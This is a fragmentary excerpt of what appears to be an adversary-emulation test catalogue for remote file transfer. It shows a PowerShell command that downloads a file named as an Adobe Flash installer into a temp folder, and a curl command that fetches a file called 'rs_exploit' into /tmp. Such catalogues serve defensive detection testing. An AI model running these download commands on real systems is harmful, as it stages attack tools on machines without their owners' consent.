...
- [Atomic Test #27 - Linux Download File](#atomic-test-27---linux-download-file)
...
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_file | URL of file to copy | Url | https://github.com/hkwany/VIndex/raw/master/VIndex/TTP/T1105/binary/Adobe_Flash_install.rar|
| destination_path | Destination path to file | Path | $env:TEMP&#92;Adobe_Flash_install.rar|
...
Invoke-WebRequest -Uri $url -OutFile #{destination_path}
```
...
## Atomic Test #27 - Linux Download File
Utilize linux Curl to download a remote file
...
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_url | url of remote host | string | 192.168.57.101|
| file_name | name of the file to download | string | rs_exploit|
| dest_path | destination to store the downloaded file | string | /tmp/rs_exploit|
...
```sh
curl http://#{remote_url}/#{file_name} --output ${dest_path}
```
